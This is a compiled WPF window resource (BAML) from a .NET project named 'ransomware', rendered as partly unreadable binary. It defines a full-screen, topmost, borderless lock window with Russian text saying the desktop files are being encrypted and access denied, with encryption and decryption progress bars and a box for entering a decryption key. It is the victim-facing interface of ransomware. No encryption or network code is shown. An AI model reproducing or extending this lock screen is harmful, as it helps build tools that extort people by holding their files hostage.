   M S B A M L   `   `   `  ????E  Aransomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'clr-namespace:ransomware
ransomware  5   	       ransomware.BGWin   5   	   \ XPresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35R NWindowsBase, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35W SPresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35D 9http://schemas.microsoft.com/winfx/2006/xaml/presentation    5   	   R NSystem.Xaml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089:x,http://schemas.microsoft.com/winfx/2006/xaml     5   	   @d2http://schemas.microsoft.com/expression/blend/2008     5   	   Jmc;http://schemas.openxmlformats.org/markup-compatibility/2006     5   	   *localclr-namespace:ransomware     5   	   -   5          ? Title$  BGWin??5   	   $
??1280??6   $	??720??6$    ? WindowStyle$
 None=?5
       ? WindowState$ 	Maximized=?5       ? 
ResizeMode$ NoResize=?5       ? Topmost . .??5      ? .+?5   
   ?? $??
10 10 10 0q?6   $	??Top=?6$   $??Center=?6<   $)??#Твоим данным капец!??6Y   $??30(?6w   ?? 5   
   $??
10 50 10 0q?6   $	??Top=?6$   $??Center=?6<   $??yЯ решил, что зашифрую файлы на рабочем столе и не дам к нему доступ.??6Y   $??20(?6?   ?? 5   
   $??10 100 10 0q?6   $	??Top=?6%   $??Center=?6=   $,??&Прогресс шифрования:??6Z   $??20(?6y   ? 5   
   -   5         ?Name$ EncProgress??5   {   $??10 140 10 0q?6   $	??Top=?6+   $??Stretch=?6C   $??20(?6a   $??30??6o    ? Minimum$ 0Q?6?    ? Maximum$	 100Q?6?   ?? 5   
   $??10 200 10 0q?6   $	??Top=?6%   $??Center=?6=   $????Если хотите выключить это приложение и расшифровать данные, то введите ключ:??6Z   $??20(?6?   ?? 5   
   -   5         ??Name$ KeyBox??5   k   $??10 240 10 0q?6   $	??Top=?6'   $??Stretch=?6?   $??20(?6]   $??Center=?6{   ?? 5   
   -   5        	 ??Name$	 KeySubmitBtn??5   ?   $??10 280 10 0q?6   $	??Top=?6&   $??Stretch=?6>   $??20(?6\   $??Расшифровать??6j   6?   ?? 5   
   $??10 350 10 0q?6   $	??Top=?6%   $??Center=?6=   $0??*Прогресс дешифрования:??6Z   $??20(?6{   ? 5   
   -   5        $ DecProgress??5   {   $??10 390 10 0q?6   $	??Top=?6+   $??Stretch=?6C   $??20(?6a   $??30??6o   $ 0Q?6?   $	 100Q?6?   ?? 5   
   -   5        
 ??Name$
 DecCount??5   s   $??10 430 10 0q?6   $	??Top=?6%   $??Center=?6=   $?? ??6Z   $??20(?6e   6s   ?? 5   
   -   5        $
 DecFile??5   s   $??10 460 10 0q?6   $	??Top=?6%   $??Center=?6=   $?? ??6Z   $??20(?6e   6s   5      5      